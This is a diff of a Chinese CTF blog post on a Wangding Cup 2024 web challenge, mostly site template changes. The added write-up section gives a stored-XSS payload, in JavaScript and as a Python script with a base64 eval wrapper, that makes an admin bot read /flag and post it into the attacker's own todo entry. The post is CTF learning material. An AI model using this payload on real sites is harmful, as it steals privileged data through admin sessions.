@@ -2,10 +2,13 @@
 <html lang=en>
 <head>
     <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="HandheldFriendly" content="True" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=5"
+    />
     <meta name="description" content="也是更新我对带外的思考了  越权与带外 没见过这种，开辟新思路了，还是做题不够多   没搞出来，dy牛，分析一下 第一波的&#x2F;flag纯靠经验猜，砂岩了，不过就算有也想不到这样 一眼注入回显型，xss和ssti，xss有点希望(boss会看，可以获取他的cookie)，但是bp collaborator和dnslog都不行，应该是不出网，不出网如何获取信息？而且这里&#x2F;flag有">
 <meta property="og:type" content="article">
 <meta property="og:title" content="web02_网鼎24">
@@ -14,35 +17,42 @@
 <meta property="og:description" content="也是更新我对带外的思考了  越权与带外 没见过这种，开辟新思路了，还是做题不够多   没搞出来，dy牛，分析一下 第一波的&#x2F;flag纯靠经验猜，砂岩了，不过就算有也想不到这样 一眼注入回显型，xss和ssti，xss有点希望(boss会看，可以获取他的cookie)，但是bp collaborator和dnslog都不行，应该是不出网，不出网如何获取信息？而且这里&#x2F;flag有">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2024-10-29T15:13:01.415Z">
-<meta property="article:modified_time" content="2024-11-04T12:00:36.860Z">
+<meta property="article:modified_time" content="2025-01-29T09:53:47.301Z">
 <meta property="article:tag" content="recurrence">
 <meta property="article:tag" content="xss">
-<meta name="twitter:card" content="summary">
-    
-    
+<meta name="twitter:card" content="summary">    
+    <link
+        rel="shortcut icon"
+        href="/images/favicon.ico"
+    />
+       
+    <link
+        rel="icon"
+        type="image/png"
+        href="/images/favicon-192x192.png"
+        sizes="192x192"
+    />
+       
+    <link
+        rel="apple-touch-icon"
+        sizes="180x180"
+        href="/images/apple-touch-icon.png"
+    />
       
-        
-          <link rel="shortcut icon" href="/images/favicon.ico">
-        
-      
-      
-        
-          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-        
-      
-      
-        
-          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-        
-      
-    
     <!-- title -->
     <title>web02_网鼎24</title>
     <!-- async scripts -->
     <!-- Google Analytics -->
 
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-Z6JGRC9FT2"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-Z6JGRC9FT2');
+  </script>
 
-    <!-- Umami Analytics -->
+ <!-- Umami Analytics -->
 
 
     <!-- styles -->
@@ -52,10 +62,9 @@
     <!-- persian styles -->
     
     <!-- rss -->
+     
+    <!-- mathjax -->
     
-    
-	<!-- mathjax -->
-	
 <meta name="generator" content="Hexo 7.3.0"></head>
 
 <body class="max-width mx-auto px3 ltr">
@@ -69,8 +78,6 @@
       <ul>
         <!--
        --><li><a href="/">Home</a></li><!--
-     --><!--
-       --><li><a href="/about/">About</a></li><!--
      --><!--
        --><li><a href="/archives/">Writing</a></li><!--
      --><!--
@@ -180,15 +187,26 @@
 <li>第一波的&#x2F;flag纯靠经验猜，砂岩了，不过就算有也想不到这样</li>
 <li>一眼注入回显型，xss和ssti，xss有点希望(boss会看，可以获取他的cookie)，但是bp collaborator和dnslog都不行，应该是不出网，不出网如何获取信息？而且这里&#x2F;flag有访问控制</li>
 <li><em><strong>这里就来到今天的重点了</strong></em><ol>
-<li>引入一个<strong>信道概念</strong>，从本质上看与网站交互的信道是单条的，带外是为了自己引进，如果带外不行的话，那如何在单条信道获取信息 -&gt; 对方返回的内容，这里最明显的就是todo，接下来就是要让对方携带cookie返回在todo里面</li>
-<li><strong>访问控制</strong>: todo可以通过post进行修改，而且注意到每一个content都有一个对于的id -&gt; 通过boss可以访问到&#x2F;flag，然后插入到我的页面</li>
-<li>payload: web02_js&#x2F;py_wangding24</li>
+<li><p>引入一个<strong>信道概念</strong>，从本质上看与网站交互的信道是单条的，带外是为了自己引进，如果带外不行的话，那如何在单条信道获取信息 -&gt; 对方返回的内容，这里最明显的就是todo，接下来就是要让对方携带cookie返回在todo里面</p>
+</li>
+<li><p><strong>访问控制</strong>: todo可以通过post进行修改，而且注意到每一个content都有一个对于的id -&gt; 通过boss可以访问到&#x2F;flag，然后插入到我的页面</p>
+</li>
+<li><p>payload</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> url = <span class="string">&quot;...&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">fetch</span>(url + <span class="string">&quot;/flag&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">    .<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> res.<span class="title function_">text</span>())</span></span><br><span class="line"><span class="language-javascript">    .<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">fetch</span>(url + <span class="string">&quot;/content/613cdda82446ae4b717db0853d7f6e16&quot;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">headers</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">body</span>: <span class="string">&quot;&lt;h1&gt;kc1zs4&lt;/h1&gt;&quot;</span> + res,</span></span><br><span class="line"><span class="language-javascript">      &#125;).<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;&#125;);</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">content_url=<span class="string">&quot;http://0192d6fc41de7e048e7a39db597b5210.g66v.dg01.ciihw.cn:46620/con</span></span><br><span class="line"><span class="string">tent/613cdda82446ae4b717db0853d7f6e16&quot;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;fetch(&#x27;/flag&#x27;).then(res =&gt; &#123;return res.text();&#125;).then(res =&gt;&#123;return fetch(&#x27;/content/613cdda82446ae4b717db0853d7f6e16&#x27;,&#123;method:&#x27;POST&#x27;,headers: &#123;&#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;&#125;,body:&#x27;content=&lt;br&gt;binbin&lt;br&gt;&#x27;+res,&#125;).then(res =&gt; &#123;&#125;);&#125;);&quot;</span></span><br><span class="line"></span><br><span class="line">payload=base64.b64encode(payload.encode()).decode()</span><br><span class="line"></span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">&#x27;content&#x27;</span>:<span class="string">f&quot;&lt;script&gt;window[&#x27;eval&#x27;](atob(&#x27;<span class="subst">&#123;payload&#125;</span>&#x27;));&lt;/script&gt;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res=requests.post(content_url,data=data)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
 </ol>
 </li>
 </ol>
 
   </div>
 </article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
 
 
 
@@ -200,8 +218,6 @@
       <ul>
         
           <li><a href="/">Home</a></li>
-        
-          <li><a href="/about/">About</a></li>
         
           <li><a href="/archives/">Writing</a></li>
         
@@ -256,7 +272,7 @@
     Copyright &copy;
     
     
-    2023-2024
+    2023-2025
     KC1zs4&#39;s Blog
   </div>
   <div class="footer-right">
@@ -264,8 +280,6 @@
       <ul>
         <!--
        --><li><a href="/">Home</a></li><!--
-     --><!--
-       --><li><a href="/about/">About</a></li><!--
      --><!--
        --><li><a href="/archives/">Writing</a></li><!--
      --><!--
@@ -369,6 +383,18 @@
 <!-- Cloudflare Analytics -->
 
 <!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'kc1zs4-github-io';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
 
 <!-- utterances Comments -->
 
